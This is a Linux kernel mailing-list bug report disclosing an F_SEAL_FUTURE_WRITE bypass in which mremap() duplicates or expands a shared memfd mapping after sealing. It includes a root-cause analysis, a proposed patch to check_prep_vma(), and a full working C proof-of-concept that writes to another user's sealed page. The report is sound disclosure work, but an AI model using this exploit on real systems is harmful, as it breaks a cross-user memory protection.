Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.50
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794020855;
	b=pMDDJOd3x3C/pX7fb9feWCSoT3DfydCNJP65EMnSv5GRBqhp88wHVfjMN2/2bbcMzCI9
	 BefHZpj2aTASyeh4GFA4xw3TYUsKXXjE5KUacLHsHDWZepQcVO48CaRBnQLI/ShUyqjpz
	 9RvwonQgmbxgC/R78glH8L9K/tUwJwI1G4T/vA/Edrp+dUgmtnVm4SwcAU9LaWi7c22qb
	 CeKJDjhmm4157PteejWiMwFc/H4SJ+FCAJAMmDR4G6WMZvnoOWlwaboqbfdb+r8nxtk2j
	 3E7D8AbtkEqyM/lhDcNpHDB7oNCvIDKM3+gdZ05eB0Ld++xc9XRv5jIogIXSC3oTB+A==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794020855;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=+5OMQOlD3uPwnAi9dWZffdLmbbYMypNRZ6Off9xCCrU=;
	b=N3iPTST1n3ZyekwM5akP0pWPOui0DfZevfgtO7ayfTHRpcIJ04l6JAfmHefhNvYGyo7o
	 CpntqdMiTTD2Bc6z2GngQyYZRlTnm1sGCKciYR8ebmRa81EaTHLEGMor/7xxIaxankJ03
	 SQdnQ0UUhDwFv2bVqyQ/aQ6qxZS9K6B2IrFRe3BVShIwbOOqwt+38uegr70aQaBdOKEJl
	 iRAbIv4waaPXvoibI0hlh/v/V6CDuzMwM+hCQpR03z189X8m0oC8lH9RYWc++1b2DYPT5
	 ZnstUT67tdc9e9hc+auHJJK4j+pvO+uT78xBtncyqQhXgWy8dqh4ZwAQ4wzwu9Sg+dA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=jLt++Shn;
	arc=none smtp.remote-ip=74.125.82.50
Received: from mail-dl1-f50.google.com (mail-dl1-f50.google.com [74.125.82.50])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3CFA4606A326
	for <linux-kernel@vger.kernel.org>; Sat,  7 Nov 2026 03:07:35 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 3CFA4606A326
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=jLt++Shn
Received: by mail-dl1-f50.google.com with SMTP id a92af1059eb24-1b2513decc3so700539c88.1
        for <linux-kernel@vger.kernel.org>; Fri, 06 Nov 2026 19:07:35 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1794020854; x=1794625654; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=+5OMQOlD3uPwnAi9dWZffdLmbbYMypNRZ6Off9xCCrU=;
        b=jLt++Shn1YvDTMlV8kAF2sBu8PYE3w5bgVfXDfaDNmmrzbKRDIU75Sk3YLD8wxPszt
         wexTpEdtgGXTK/62Md6gn0WXMcnuHNGuHP2ezBi5ACFThgGPZ7MTY3tJWsGpiPsPfWxv
         ViJbxHgqWKZHSgodzByndeRJ0maNGiMQngvvvWYn9z1BR1PdqKt8y2GOByHHdcDcMoKk
         eLXfaVMH4hvrsx70yOsUyxPnItkqajZlTyUn4vjVu3D1Lv2sIB+BaoNrdX4QJJDw1Dgr
         RSL4/QX0mTc7Y5i+Q/aFBYZrZ6CpImNPyL4190LaWNZuUqArOqSxQY47D0JtL5I6KrmE
         QpNA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794020854; x=1794625654;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=+5OMQOlD3uPwnAi9dWZffdLmbbYMypNRZ6Off9xCCrU=;
        b=2xkpggNYFbswQkMnJto5gEDoZNDVU0beaufnI7FIFNyauGUOjPKoazdHJd+sEku8ng
         QRRHHUGudbI8VHi2/DdXLwp7Zv3W/0gAezoyILpisD1U4EDQyQPD6aJppNEWzjbr6C9f
         gDXDBzWcygqrxbP/k2Sb7NVqlOoa3n6YZvQsXJA5UGSIa8GSfTwGlc5pzoKBGx25uC6d
         60EPmTFcRgEjJJvEJProf5T3SEhe4bZTfPuHIISOPbf1deuk5o1x9T8gXDgGpmDy4bP/
         MrZBQ9E+OTR8o6USyiwcxQBWC8adm1oSk35I3oQOopHZ7RiwW2I5niDsBJnIVAUjYrKf
         jGdA==
X-Forwarded-Encrypted: i=1; AKwUvBwYG4Sn4J+soikdc4nBYrCWcSFnG4Bjq4C+9TafUAlKnajUEMmjwTX/oQqsM/9g7aIOQahp8FGtN1NQWMA=@vger.kernel.org
X-Gm-Message-State: APuU4Z+DRbPi0T9wXQFk2p/WWICge8kNUSfS9QCurvvsyh9Xn72NYd7w
	90bjh3UucffbtA0xY8YQKQKcqVBg3/mGcgqEpLpTIj8PeUTfplhB92Fl
X-Gm-Gg: AYBFou0hOwQRPmxJaMGYQTXuq9kmY2Cu7lMCQ1J95RlqnTF88c+bSiU778rlV5DkXG9
	nvHRxld3cczcb7QRLcGO9fJ7k3divLcaczeBVhW9+5yVoS/mJkoUWT9++Nd87nhdRavmkMKm9o+
	dcygzLnn1OSWFVgoHg+SGFu3CJwyU2qEqmXr4g7QMA+nY2mhsdlTx98ql2YAWT6ggUFfGIR6P9i
	Maaggl82Kj+Owt7cmmdnMpPju4H9bKVIVRsxyKrddVRBIH/wEJRo1p6L+8Bx6KlOtb/vgDJt6JY
	oBnYqlYoa71rXMt+9jLfw7J+Lu8Nigzl6mkrkVj/wSbdsAw2TW8zSVkfyWL8NoXIBEGMqxjrx+r
	vEjlFC6yAMZFdzOV6f9DN7KVTvCv4sfQRFs6dFMAciN/m+14ugnHX+AWu0bsPXUENx/yElPfP+E
	3q8Scd9PgnuKC6GIhImtVqXbRSMwGLGZnmLKe8V889S5WFJXFehF0Zw3bWyxbgrfF6DV1p13zP6
	NjJDuf3bksI23a5+QWlpLw0XHSfBcx/e/wCb6i/8JZc3B83r2SakQihc4gOzc3wADcoaWJfBBsw
	cU8N+VB4oeU2mSdFBTwOGaY/dtN7TaZ/id6uMQNQKSoZV8eIMeI=
X-Received: by 2002:a05:7022:ef07:b0:194:9e7a:3ba2 with SMTP id a92af1059eb24-1b25d29407bmr6193447c88.2.1794020854124;
        Fri, 06 Nov 2026 19:07:34 -0800 (PST)
Received: from localhost.localdomain ([112.170.44.210])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-1b25e4df114sm10141554c88.18.2026.11.06.19.07.31
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 06 Nov 2026 19:07:33 -0800 (PST)
From: Junyoung Jang <graypanda.inzag@gmail.com>
To: Andrew Morton <akpm@linux-foundation.org>,
	"Liam R . Howlett" <liam@infradead.org>,
	Lorenzo Stoakes <ljs@kernel.org>,
	Hugh Dickins <hughd@google.com>,
	David Hildenbrand <david@kernel.org>
Cc: Vlastimil Babka <vbabka@kernel.org>,
	Jann Horn <jannh@google.com>,
	Pedro Falcato <pfalcato@suse.de>,
	Baolin Wang <baolin.wang@linux.alibaba.com>,
	linux-mm@kvack.org,
	linux-kernel@vger.kernel.org,
	Junyoung Jang <graypanda.inzag@gmail.com>
Subject: mm/mremap: F_SEAL_FUTURE_WRITE can be bypassed via mremap() VMA expansion/duplication
Date: Sat,  7 Nov 2026 12:07:08 +0900
Message-ID: <20261107030708.1031977-1-graypanda.inzag@gmail.com>
X-Mailer: git-send-email 2.43.0
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Post: <mailto:linux-kernel@vger.kernel.org>
List-Help: <mailto:linux-kernel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hello,

I found a reproducible F_SEAL_FUTURE_WRITE seal-policy bypass. A process
holding a one-page shared writable memfd mapping created before the seal can
use mremap() after the seal to gain writable access to additional file pages.

In the accompanying two-UID reproducer, the second page belongs to a memfd
created by a different unprivileged user. While a new writable mmap() and
pwrite() to that second page both fail with -EPERM, the mremap() path
succeeds and modifies the page's contents.

Affected tree tested:

- Linux 7.4.0-rc1-gd48723711bae, built directly from upstream commit
  d48723711bae9b8cdc56719c448ba42fef28cbee using x86_64_defconfig.
- A second image built from the same commit with the proposed mm/mremap.c
  diff, reported by uname as 7.4.0-rc1-gd48723711bae-dirty.
- Each before/after pair was booted in QEMU with the same statically
  linked C PoC.

Root cause:

The missing seal check is in mm/mremap.c:check_prep_vma() (lines 1808-1872
of the tested commit). mmap() calls memfd_check_seals_mmap() at
mm/mmap.c:499; for F_SEAL_FUTURE_WRITE, mm/memfd.c:384-385 rejects a
new shared writable mapping with EPERM. check_prep_vma() has no equivalent
check before it permits a larger mapping.

For the PoC's old_len=0 call, this condition at mm/mremap.c:1819 only
rejects duplication of a non-shared VMA:

    if (!old_len && !vma_test_any(vma, VMA_SHARED_BIT, VMA_MAYSHARE_BIT)) {

It is false for the PoC's MAP_SHARED VMA. check_prep_vma() then checks
VMA bounds and expansion limits and returns 0 at mm/mremap.c:1872 without
checking vma->vm_file for write seals. For this zero-length call,
expand_vma() moves the VMA and reaches copy_vma_and_data(), which calls
copy_vma() with the larger new_len (mm/mremap.c:1293-1295):

    new_vma = copy_vma(&vma, vrm->new_addr, vrm->new_len, new_pgoff,
                       new_anon_pgoff, &pmc.need_rmap_locks,
                       vrm->flags & MREMAP_DONTUNMAP);

copy_vma() can duplicate the original VMA and extend its range
(mm/vma.c:2052-2055), retaining VM_WRITE and VM_MAYWRITE. The newly
covered second memfd page is writable despite F_SEAL_FUTURE_WRITE.
Ordinary expansion with old_len=one page also succeeded on the unpatched
kernel. A read-only shared mapping with VM_MAYWRITE can likewise be
expanded and then changed to PROT_WRITE with mprotect().

Impact:

This allows a process to write to file pages outside its pre-seal mapping
across a UID boundary, affecting scenarios where a memfd owner grants
limited writable access to a specific range before sealing and relies on
F_SEAL_FUTURE_WRITE to prevent future writable mappings of other pages.

Reproducer summary:

1. Start as root only to set up two distinct unprivileged UIDs (10002 for
   the owner, 10001 for the writer); both drop all capabilities.
2. UID 10002 creates a two-page memfd and initializes page two to 'A'.
3. UID 10002 passes the fd to UID 10001 via SCM_RIGHTS.
4. UID 10001 maps only page one with MAP_SHARED and PROT_WRITE.
5. UID 10002 adds F_SEAL_FUTURE_WRITE.
6. UID 10001 confirms a fresh writable mmap() of page two and pwrite() to it
   both fail with -EPERM.
7. UID 10001 calls mremap(old_addr, 0, 2 * page_size, MREMAP_MAYMOVE),
   writes 'Z' through the expanded mapping, and UID 10002 reads 'Z' back
   from the second file page.

Build and run:
  $ cc -O0 -g -Wall -Wextra -Werror -static memfd_future_write_mremap_poc.c -o poc
  $ sudo ./poc
  writer uid=10001; mmap=EPERM; pwrite=EPERM; mremap write=Z; result=63
  owner uid=10002; file page 2=Z; size=8192; result=255

Suggested fix direction:

I believe mremap() needs to check the memfd write seal before duplicating
(old_len=0) or expanding (new_len > old_len) a shared VMA that has
VM_MAYWRITE.

I tested the rough diff below in check_prep_vma() on the same commit and
confirmed that it blocks the reproducer (mremap fails with -EPERM). However,
I am sending this as a bug report rather than a formal [PATCH] because I am
unsure about potential side effects:

1. Because a PROT_READ shared mapping with VM_MAYWRITE could be expanded and
   later made writable via mprotect(), the diff temporarily sets VMA_WRITE_BIT
   on a local flags copy to force memfd_check_seals_mmap() to return -EPERM.
   However, this rejects legitimate read-only mremap() expansions outright,
   whereas mmap() would normally allow a read-only mapping and simply clear
   VM_MAYWRITE.
2. I am not certain whether check_prep_vma() is the right place regarding
   locking/synchronization against a concurrent F_ADD_SEALS call.

I would appreciate your guidance on the proper way to handle this, or feel
free to take it from here:

diff --git a/mm/mremap.c b/mm/mremap.c
index 70b7264aa..6ed390ed4 100644
--- a/mm/mremap.c
+++ b/mm/mremap.c
@@ -14,6 +14,7 @@
 #include <linux/shm.h>
 #include <linux/ksm.h>
 #include <linux/mman.h>
+#include <linux/memfd.h>
 #include <linux/swap.h>
 #include <linux/capability.h>
 #include <linux/fs.h>
@@ -1807,6 +1808,17 @@ static int check_prep_vma(struct vma_remap_struct *vrm)
 
 	old_len = vrm->old_len;
 	new_len = vrm->new_len;
+	if (new_len > old_len && vma->vm_file &&
+	    vma_test_all(vma, VMA_SHARED_BIT, VMA_MAYWRITE_BIT)) {
+		vma_flags_t flags = vma->flags;
+		int err;
+
+		/* A larger VMA could become writable via mprotect(). */
+		vma_flags_set(&flags, VMA_WRITE_BIT);
+		err = memfd_check_seals_mmap(vma->vm_file, &flags);
+		if (err)
+			return err;
+	}
 
 	/*
 	 * !old_len is a special case where an attempt is made to 'duplicate'

Reproducer code (memfd_future_write_mremap_poc.c):

// SPDX-License-Identifier: GPL-2.0
/*
 * Check whether a mapping created before F_SEAL_FUTURE_WRITE can be
 * duplicated over a second page by a different UID after the seal.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/capability.h>
#include <linux/memfd.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define OWNER_UID 10002
#define WRITER_UID 10001

static int drop_to(uid_t uid)
{
	struct __user_cap_header_struct hdr = {
		.version = _LINUX_CAPABILITY_VERSION_3, .pid = 0,
	};
	struct __user_cap_data_struct caps[2] = { { 0 }, { 0 } };

	if (setgroups(0, NULL) || setresgid(uid, uid, uid) ||
	    setresuid(uid, uid, uid))
		return -1;
	if (getuid() != uid || geteuid() != uid ||
	    syscall(SYS_capget, &hdr, caps) ||
	    caps[0].effective || caps[1].effective)
		return -1;
	return 0;
}

static int send_fd(int sock, int fd)
{
	char data = 'F';
	char control[CMSG_SPACE(sizeof(fd))] = {};
	struct iovec iov = { .iov_base = &data, .iov_len = 1 };
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);

	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
	memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
	return sendmsg(sock, &msg, 0) == 1 ? 0 : -1;
}

static int recv_fd(int sock)
{
	char data;
	char control[CMSG_SPACE(sizeof(int))] = {};
	struct iovec iov = { .iov_base = &data, .iov_len = 1 };
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	struct cmsghdr *cmsg;
	int fd;

	if (recvmsg(sock, &msg, 0) != 1 || data != 'F')
		return -1;
	cmsg = CMSG_FIRSTHDR(&msg);
	if (!cmsg || cmsg->cmsg_level != SOL_SOCKET ||
	    cmsg->cmsg_type != SCM_RIGHTS ||
	    cmsg->cmsg_len != CMSG_LEN(sizeof(fd)))
		return -1;
	memcpy(&fd, CMSG_DATA(cmsg), sizeof(fd));
	return fd;
}

static int writer(int sock, size_t page)
{
	char *old, *expanded;
	char event;
	int fd;
	unsigned int result = 0;

	if (drop_to(WRITER_UID) || getuid() != WRITER_UID)
		return 1;
	result |= 1;
	fd = recv_fd(sock);
	if (fd < 0)
		return 2;
	old = mmap(NULL, page, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (old == MAP_FAILED)
		return 3;
	result |= 2;
	if (write(sock, "R", 1) != 1 || read(sock, &event, 1) != 1 ||
	    event != 'S')
		return 4;
	result |= 4;
	void *fresh = mmap(NULL, page, PROT_READ | PROT_WRITE, MAP_SHARED,
			   fd, page);
	if (fresh != MAP_FAILED) {
		munmap(fresh, page);
		fprintf(stderr, "writer: fresh writable mmap unexpectedly succeeded\n");
		return 5;
	}
	if (errno != EPERM) {
		fprintf(stderr, "writer: fresh writable mmap errno=%d\n", errno);
		return 6;
	}
	result |= 8;
	errno = 0;
	ssize_t written = pwrite(fd, "X", 1, page);
	if (written != -1 || errno != EPERM) {
		fprintf(stderr, "writer: pwrite returned %zd errno=%d\n",
			written, errno);
		return 7;
	}
	result |= 16;
	expanded = mremap(old, 0, 2 * page, MREMAP_MAYMOVE);
	if (expanded == MAP_FAILED) {
		fprintf(stderr, "writer: mremap errno=%d\n", errno);
		return 8;
	}
	expanded[page] = 'Z';
	result |= 32;
	if (write(sock, "Z", 1) != 1)
		return 9;
	printf("writer uid=%u; mmap=EPERM; pwrite=EPERM; mremap write=Z; result=%u\n",
	       getuid(), result);
	fflush(stdout);
	munmap(expanded, 2 * page);
	munmap(old, page);
	close(fd);
	return result == 63 ? 0 : 10;
}

int main(void)
{
	int pair[2], fd, status;
	char event, byte = 0;
	struct stat st;
	pid_t pid;
	size_t page = sysconf(_SC_PAGESIZE);
	unsigned int result = 0;

	alarm(10);
	if (geteuid() != 0)
		return 77;
	if (socketpair(AF_UNIX, SOCK_SEQPACKET, 0, pair))
		return 1;
	pid = fork();
	if (pid < 0)
		return 2;
	if (!pid) {
		close(pair[0]);
		_exit(writer(pair[1], page));
	}
	close(pair[1]);
	if (drop_to(OWNER_UID) || getuid() != OWNER_UID)
		return 3;
	result |= 1;
	fd = memfd_create("seal-cross-uid", MFD_ALLOW_SEALING);
	if (fd < 0 || ftruncate(fd, 2 * page) ||
	    pwrite(fd, "A", 1, page) != 1)
		return 4;
	result |= 2;
	if (send_fd(pair[0], fd) || read(pair[0], &event, 1) != 1 ||
	    event != 'R')
		return 5;
	result |= 4;
	if (fcntl(fd, F_ADD_SEALS, F_SEAL_FUTURE_WRITE))
		return 6;
	result |= 8;
	if (write(pair[0], "S", 1) != 1)
		return 7;
	if (read(pair[0], &event, 1) != 1 || event != 'Z') {
		if (waitpid(pid, &status, 0) == pid && WIFEXITED(status))
			fprintf(stderr, "owner: writer exited %d before Z\n",
				WEXITSTATUS(status));
		return 7;
	}
	result |= 16;
	if (pread(fd, &byte, 1, page) != 1 || byte != 'Z')
		return 8;
	result |= 32;
	if (fstat(fd, &st) || st.st_size != (off_t)(2 * page))
		return 9;
	result |= 64;
	if (waitpid(pid, &status, 0) != pid ||
	    !WIFEXITED(status) || WEXITSTATUS(status))
		return 10;
	result |= 128;
	printf("owner uid=%u; file page 2=%c; size=%lld; result=%u\n",
	       getuid(), byte, (long long)st.st_size, result);
	fflush(stdout);
	return result == 255 ? 0 : 11;
}

Best regards,
Junyoung Jang <graypanda.inzag@gmail.com>
